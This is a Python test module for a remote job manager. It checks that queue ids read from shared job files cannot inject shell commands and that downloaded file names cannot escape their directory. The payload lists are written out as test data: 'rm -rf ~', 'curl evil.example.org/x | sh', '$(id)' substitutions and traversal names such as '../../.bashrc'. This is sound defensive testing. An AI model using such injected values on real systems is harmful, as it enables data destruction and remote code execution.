"""Two ways a string from elsewhere could act on the user's behalf.

Both were found by reviewing the code that opening a job list newly reaches: a
`.pmejbs` file can come from a colleague or a backup, so every field in a job
record is attacker-controlled once the user opens one.

1. The queue id was interpolated into a remote shell command unquoted, so
   `12345; rm -rf ~` in a job record became a command the user's own account ran
   on the cluster when they pressed Cancel.
2. File names in the remote directory listing were joined straight onto the
   local download directory, so a remote host answering `../../.bashrc` wrote
   outside it.
"""

import os
import tempfile
import unittest

from job_manager import remote_runner, remote_runner_ps, runner
from job_manager.models import MODE_RUNNER, Job, SubmitPreset
from job_manager.schedulers import get_scheduler
from job_manager.store import JobStore

from .fakes import FakeTransport, make_host

INJECTIONS = (
    "12345; rm -rf ~/important",
    "1 && curl evil.example.org/x | sh",
    "$(id)",
    "`id`",
    "1 | tee /tmp/x",
    "1\nrm -rf ~",
)


class TestTheQueueIdCannotCarryACommand(unittest.TestCase):
    def test_every_scheduler_quotes_it(self):
        for name in ("slurm", "pbs", "sge", "shell"):
            scheduler = get_scheduler(name)
            for payload in INJECTIONS:
                command = scheduler.cancel_command(payload)
                with self.subTest(scheduler=name, payload=payload):
                    # The dangerous character must never sit outside quotes.
                    self.assertNotIn(f" {payload}", command)
                    self.assertIn("'", command)

    def test_an_ordinary_id_is_left_readable(self):
        self.assertEqual(get_scheduler("slurm").cancel_command("12345"), "scancel 12345")
        self.assertEqual(get_scheduler("sge").cancel_command("987"), "qdel 987")

    def test_a_pbs_style_id_with_a_host_suffix_survives(self):
        self.assertEqual(
            get_scheduler("pbs").cancel_command("123.head.cluster"), "qdel 123.head.cluster"
        )

    def test_the_shell_scheduler_quotes_both_uses(self):
        command = get_scheduler("shell").cancel_command("12345; id")
        self.assertEqual(command.count("'12345; id'"), 2)

    def test_cancel_sends_the_quoted_form(self):
        host = make_host(scheduler="slurm")
        transport = FakeTransport(host)
        job = Job(id="j1", remote_job_id="12345; rm -rf ~")
        runner.cancel_job(transport, host, job)
        sent = transport.commands[-1]
        self.assertIn("'12345; rm -rf ~'", sent)
        self.assertNotIn("scancel 12345; rm", sent)


class TestTheHelperQueueEntryCannotCarryACommand(unittest.TestCase):
    """The same id, on the one path that cannot quote it.

    A runner entry is half of a path built *inside* the command
    (``mv "queue/$entry"``), so quoting it is not available -- it is checked
    against the shape :func:`remote_runner.entry_name` writes instead. Both
    flavours, because the bash one interpolated it raw while the PowerShell
    one quoted, and a guarantee that holds in one shell is not a guarantee.
    """

    FLAVOURS = (remote_runner, remote_runner_ps)
    BUILDERS = ("cancel_command", "release_command", "enqueue_command")

    def test_an_entry_that_is_not_ours_is_refused(self):
        payloads = INJECTIONS + (
            'job_0001_x$(id > /tmp/pwned).sh',
            'job_0001_a"; id; #',
            "job_0001_a`id`.sh",
            "../../../etc/passwd",
            "",
        )
        for flavour in self.FLAVOURS:
            for builder in self.BUILDERS:
                for payload in payloads:
                    with self.subTest(flavour=flavour.__name__, cmd=builder, payload=payload):
                        with self.assertRaises(remote_runner.UnsafeEntry):
                            getattr(flavour, builder)("~/jobs/.moleditpy_runner", payload)

    def test_a_real_entry_still_works(self):
        entry = remote_runner.entry_name(7, "a1b2c3d4e5f6")
        self.assertEqual(entry, "job_0007_a1b2c3d4e5f6.sh")
        for builder in self.BUILDERS:
            command = getattr(remote_runner, builder)("~/jobs/.moleditpy_runner", entry)
            self.assertIn(entry, command)
        ps_entry = remote_runner.entry_name(7, "a1b2c3d4e5f6", ".ps1")
        for builder in self.BUILDERS:
            command = getattr(remote_runner_ps, builder)("~/jobs", ps_entry)
            self.assertIn(ps_entry, command)

    def test_cancelling_a_crafted_job_sends_nothing(self):
        host = make_host(scheduler="shell", concurrency_mode=MODE_RUNNER)
        self.assertTrue(host.uses_remote_runner)
        transport = FakeTransport(host)
        job = Job(id="j1", remote_job_id='job_0001_x$(rm -rf ~).sh')

        with self.assertRaises(remote_runner.UnsafeEntry):
            runner.cancel_in_runner(transport, host, job)
        self.assertEqual(transport.commands, [])

    def test_a_job_that_never_queued_is_not_an_error(self):
        host = make_host(scheduler="shell", concurrency_mode=MODE_RUNNER)
        transport = FakeTransport(host)

        runner.cancel_in_runner(transport, host, Job(id="j1", remote_job_id=""))
        runner.release_in_runner(transport, host, Job(id="j2", remote_job_id=""))
        self.assertEqual(transport.commands, [])


class TestDownloadsStayInTheirDirectory(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="download_safety_")
        # Nested so that "../.." from the download directory still lands inside
        # this test's own temp tree, never in the shared temp directory.
        self.local = os.path.join(self.tmp, "a", "b", "results")
        self.host = make_host()

    def test_a_traversing_name_is_rejected(self):
        for name in ("../../.bashrc", "../x", "/etc/passwd", "sub/dir.out", "..", "."):
            with self.subTest(name=name):
                self.assertEqual(runner.safe_download_name(name), "")

    def test_a_backslash_path_is_rejected(self):
        self.assertEqual(runner.safe_download_name(r"..\..\evil.bat"), "")
        self.assertEqual(runner.safe_download_name(r"C:\windows\x"), "")

    def test_ordinary_names_pass(self):
        for name in ("mol.out", "job.log", "a b.xyz", "run-1.hess", ".hidden"):
            self.assertEqual(runner.safe_download_name(name), name)

    def test_the_listing_drops_them(self):
        transport = FakeTransport(self.host).when(
            "ls -p -1", stdout="mol.out\n../../.bashrc\n/etc/passwd\nsub/\njob.log\n"
        )
        self.assertEqual(runner.list_remote_files(transport, "~/jobs/1"), ["mol.out", "job.log"])

    def test_nothing_is_written_outside_the_download_directory(self):
        transport = FakeTransport(self.host).when("ls -p -1", stdout="mol.out\n../../.bashrc\n")
        job = Job(id="j1", remote_dir="~/jobs/1", log_file="job.log", fetch_globs=["*"])
        runner.fetch_results(transport, job, self.local)
        inside = os.path.abspath(self.local) + os.sep
        for _remote, local_path in transport.downloads:
            self.assertTrue(
                os.path.abspath(local_path).startswith(inside),
                f"{local_path} is outside {self.local}",
            )
        # And the traversal target itself was never created, wherever it lands.
        self.assertFalse(os.path.exists(os.path.abspath(os.path.join(self.local, "../../.bashrc"))))

    def test_the_legitimate_file_still_arrives(self):
        transport = FakeTransport(self.host).when("ls -p -1", stdout="mol.out\n../../.bashrc\n")
        job = Job(id="j1", remote_dir="~/jobs/1", log_file="job.log", fetch_globs=["*.out"])
        downloaded = runner.fetch_results(transport, job, self.local)
        self.assertEqual([os.path.basename(p) for p in downloaded], ["mol.out"])


class TestOpeningAJobListCannotLeakSecrets(unittest.TestCase):
    """A job list is data, not configuration: it must not bring hosts with it."""

    def test_a_job_file_carries_no_host_or_password(self):
        tmp = tempfile.mkdtemp(prefix="joblist_")
        store = JobStore(tmp)
        store.add_job(Job(id="j1", name="a", preset=SubmitPreset().to_dict()))
        with open(store.jobs_path, encoding="utf-8") as handle:
            written = handle.read()
        for field in ("hostname", "username", "key_path", "password"):
            self.assertNotIn(f'"{field}"', written, field)


class TestTailPathsStayInsideTheJobDirectory(unittest.TestCase):
    def test_unsafe_log_name_is_not_sent_to_the_host(self):
        transport = FakeTransport(make_host())
        job = Job(remote_dir="~/jobs/1", log_file="../../secret")

        self.assertEqual(runner.tail_log(transport, job), "")
        self.assertEqual(transport.commands, [])

    def test_unsafe_selected_name_is_not_sent_to_the_host(self):
        transport = FakeTransport(make_host())
        job = Job(remote_dir="~/jobs/1")

        self.assertEqual(runner.tail_remote_file(transport, job, "/etc/passwd"), "")
        self.assertEqual(transport.commands, [])


if __name__ == "__main__":
    unittest.main()
